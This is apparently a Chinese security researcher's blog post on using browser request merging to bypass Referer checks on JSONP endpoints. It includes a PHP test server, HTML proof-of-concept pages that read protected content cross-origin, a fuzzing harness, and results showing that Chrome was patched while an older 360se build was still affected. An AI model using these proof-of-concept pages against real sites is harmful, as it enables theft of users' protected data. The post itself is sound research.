# 使用request merging bypass referer(jsonp) 检测

## 1. 关于request merging和其会产生的问题

request merging : 浏览器会把多次相同的请求(并非所有请求)合并成一次，以加快资源加载速度。

e.g. 
```html
<script type="text/javascript" src="http://0.0.0.0:8888/jsonp/1"></script>
<script type="text/javascript" src="http://0.0.0.0:8888/jsonp/1"></script>
<script type="text/javascript" src="http://0.0.0.0:8888/jsonp/1"></script>
```
只会请求并加载一次"http://0.0.0.0:8888/jsonp/1"资源。

*曾经有研究指出，这种请求合并想象在iframe里也存在*，那么浏览器的这种特性就可以用来bypass部分程序的referer的判断，如jsonp的防御机制。

## 2. 环境和POC

绕过referer检测，攻击者能否拿到进行referer保护的用户信息？

攻击者服务器： http://example.com:8081
目标服务器： http://example.com:8082
referer检测： referer是否以“http://example.com:8082”开头
目标： 攻击者拿到属于用户的 "security content"

### 环境：

/jsonp.php
```php
<?php

function startsWith($url, $domain) {
     $length = strlen($domain);
     return (substr($url, 0, $length) === $domain);
}

$referrer = @$_SERVER['HTTP_REFERER'];

if (startsWith($referrer, "http://example.com:8082")) {
    $js_code = 'function jquery() { return "security content";}';
    echo $js_code;
} else {
    $js_code = 'function jquery() { return "nothing";}';
    echo $js_code;
}

```

/index.html
```html
<!DOCTYPE html>
<html>
<head>
    <title>index in http://0.0.0.0</title>
</head>
<body>
<script type="text/javascript" src="http://example.com:8082/jsonp.php"></script>
<script type="text/javascript">
    document.write(location.href + ":" +jquery());
</script>

</body>
</html>
```

### poc
http://example.com:8081/poc.html
```
<iframe src="http://example.com:8082/"></iframe>
<script type="text/javascript" src="http://example.com:8082/jsonp.php"></script>
<script type="text/javascript">
    document.write(jquery());
</script>
```

正常情况这个poc是没有办法获得jsonp里面的信息的，因为不能bypass`startsWith($referrer, "http://example.com:8082")`的检测。
但是在request merging的情况下，浏览器因为script资源的url是相同的，所以它只会请求`http://example.com:8082/jsonp.php`一次，则我们可以在`example.com:8081`里拿到只有`example.com:8082`可以拿到的资源。

## 第一次实验

访问：http://example.com:8081/poc.html

![](http://ww1.sinaimg.cn/large/005y7Ba5gy1fj4612z2h6j310q0fc3zw.jpg)

失败了...
之后我开始不正经了...

## fuzz response size in script src

难不成是response请求包大小的问题？请求太小的情况下，没有必要合并请求，所以浏览器直接不合并了？fuzz一下看看多大的请求会被合并。

代码：
flask:
```python
from flask import Response, Flask, stream_with_context

app = Flask(__name__)

@app.route('/jsonp/<int:size>')
def jsonp(size):
    def _genrate_file(size):
        yield "1"
        yield "\0" * (size-1)
    return Response(stream_with_context(_genrate_file(size)))

if __name__ == "__main__":
    app.run(debug=True, threaded=True, port=8888, host="0.0.0.0")
```
html:
```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>fuzz size of response about request merging</title>
</head>
<body>
<script type="text/javascript">
(function(){
    for (var size = 3; size <= 100; size++) {
        var iframe = document.createElement('iframe');
        var html = '';
        for (var i = 3; i >= 0; i--) {
            html = html + 
            '<script src=http://0.0.0.0:8888/jsonp/'
            + size
            + '></'
            + 'script>';
        }
        iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(html);
        document.body.appendChild(iframe);
    }
})();
</script>
</body>
</html>
```
实验结果，所有请求都合并了。我连1024都没有乘。很小很小的请求都会合并。

## iframe并不会merging??

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>iframe request merging</title>

<!-- test1 -->
<script type="text/javascript" src="http://0.0.0.0:8888/jsonp/102400"></script>
</head>
<body>
<script type="text/javascript">
(function(){
    for (var size = 1; size <= 10; size++) {
        var iframe = document.createElement('iframe');
        html = '<script type="text/javascript" src="http://0.0.0.0:8888/jsonp/102400"></s' + 'cript>'
        iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(html);
        document.body.appendChild(iframe);
    }
})();
</script>

<!-- test2 -->
<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.js"></script>
<iframe src="data:text/html;charset=utf-8,%3Cscript%20src%3D%22https%3A%2F%2Fcdn.bootcss.com%2Fjquery%2F3.2.1%2Fjquery.js%22%3E%3C%2Fscript%3E"></iframe>

<!-- test3 -->
<iframe src="./many_out_script.html"></iframe>

</body>
</html>
```

测试了三次。果然都没有合并请求...

绝招！问大佬： https://twitter.com/nearg1e/status/903297400797663232

@filedescriptor 是twitter上专注于浏览器安全的安全研究员，之前的“iframe也会发生 request merging”的结论也是他得出来的。

请教结果： 5月12日的时候验证chrome已经修复了该问题。好吧居然fix了。

## 大部分的国产浏览器依然受影响。

之前windows上对多款浏览器进行过UXSS的测试和特权域API的分析，所以windows环境里还有多款国产浏览器。我们知道大部分国产浏览器是基于chromium的，而且版本更新并不会像chrome那么勤快，特别是内核的更新一直是相对比较缓慢的。很多Nday都可以用(可是src不收呀！)。

test in 360se 8.2.1.340

![](http://ww1.sinaimg.cn/large/005y7Ba5gy1fj46nc4gr1j31d90nowgp.jpg)

poc修改为:
```html
<body>
    <iframe src="http://example.com:8082/"></iframe>
    <iframe src="http://example.com:8081/"></iframe>
</body>
```

这样保证了，攻击者域中的请求后执行。
思路验证成功。

## other

现在很多浏览器漏洞(bug)都是和新特性(feature)相关的，或许request merging还有别的用处？

## link

https://twitter.com/nearg1e/status/903297400797663232
Exploiting the unexploitable with lesser known browser tricks from filedescriptor



